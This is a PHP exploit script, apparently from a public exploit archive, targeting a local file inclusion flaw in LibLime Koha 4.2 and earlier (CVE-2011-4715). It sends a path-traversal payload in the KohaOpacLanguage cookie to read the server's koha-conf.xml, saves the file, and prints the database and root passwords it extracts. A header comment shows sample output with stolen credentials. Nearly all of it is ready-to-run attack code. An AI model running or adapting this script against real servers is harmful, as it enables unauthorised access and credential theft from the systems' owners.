<?php
/**
Vulnerability: LibLime Koha <= 4.2 - Local File Inclusion Vulnerability
CVE: 2011-4715
OSVDB-ID: 77322
EDB-ID: 18153
Author: Munir Njiru
Site: http://munir.skilledsoft.com

Test Environment Used: 

Attack Machine : Windows 7
Victim Server  : Ubuntu 10.04.3 LTS  

C:\scripter>php koha_LFI.php target.example.com
Attempting to retrieve Information From Server Please Be Patient:

Summary Information
____________________________
Database Connection Details:
____________________________
Database Type: mysql
Database User: root
Database Pass: @pass123#ladsal
________________________________
Root Password From Server Info:
________________________________
Root Pass: manager0921312

Full Config Downloaded to current Directory with Filename: downloaded-config.xml

C:\scripter>
*/

error_reporting(0);
$script = $argv[0];
$target = $argv[1];

$vuln_script = "/cgi-bin/koha/opac-main.pl";

$headers = array(
    'Accept: */*',
    'User-Agent: Alienwithin/4.0 (compatible; MSIE 6.0; HackintoshTuxu 4.0; .NET CLR 1.1.4322)',
    'Cookie: sessionID=1;KohaOpacLanguage=../../../../../../../../etc/koha/koha-conf.xml%00',
    'Connection: Close',
    'Pragma: no-cache',
    'Cache-Control: no-cache'
);
function banner()
{
    echo "\nKoha LibLime <= 4.2 - LFI Sploiter by Alienwithin \n";
    echo "Site: http://munir.skilledsoft.com \n\n";
    echo "CVE: 2011-4715, OSVDB-ID:77322, EDB-ID: 18153 \n\n";
    echo "Usage: php Koha_LFI.php target_host \n\n";
    echo "Example: php Koha_LFI.php target.com \n\n ";
    echo "##########################################\n\n";
}

if ($target == "") {
    banner();
} else {
    $perform_LFI = curl_init();
    curl_setopt_array($perform_LFI, array(
        CURLOPT_CUSTOMREQUEST => "GET",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_BINARYTRANSFER => true,
        CURLOPT_URL => 'http://' . $target . $vuln_script,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_HEADER => False
    ));
    $result = curl_exec($perform_LFI);
    echo banner() . "Attempting to retrieve Information From Server Please Be Patient: \n\n";
    if (!curl_exec($perform_LFI)) {
        die('Error: "' . curl_error($perform_LFI) . '" - Code: ' . curl_errno($perform_LFI));
    }
    
    
    $filename = "downloaded-config.xml";
    file_put_contents($filename, $result, FILE_APPEND, $context = null);
    
    
    
    
    echo "Summary Information\n";
    echo "____________________________\n";
    echo "Database Connection Details: \n";
    echo "____________________________\n";
    $koha_db_user     = filter_tag_value($result, "user");
    $koha_db_pass     = filter_tag_value($result, "pass");
    $koha_db_type     = filter_tag_value($result, "db_scheme");
    $koha_root_biblio = filter_tag_value($result, "password");
    
    echo "Database Type: " . $koha_db_type . "\n";
    echo "Database User: " . $koha_db_user . "\n";
    echo "Database Pass: " . $koha_db_pass . "\n";
    
    echo "________________________________\n";
    echo "Root Password From Server Info: \n";
    echo "________________________________\n";
    echo "Root Pass: " . $koha_root_biblio . "\n\n";
    
    echo "Full Config Downloaded to current Directory with Filename: downloaded-config.xml";
}

function filter_tag_value($string, $tagname)
{
    $pattern = "/<$tagname ?.*>(.*)<\/$tagname>/";
    preg_match($pattern, $string, $matches);
    return $matches[1];
}





?>
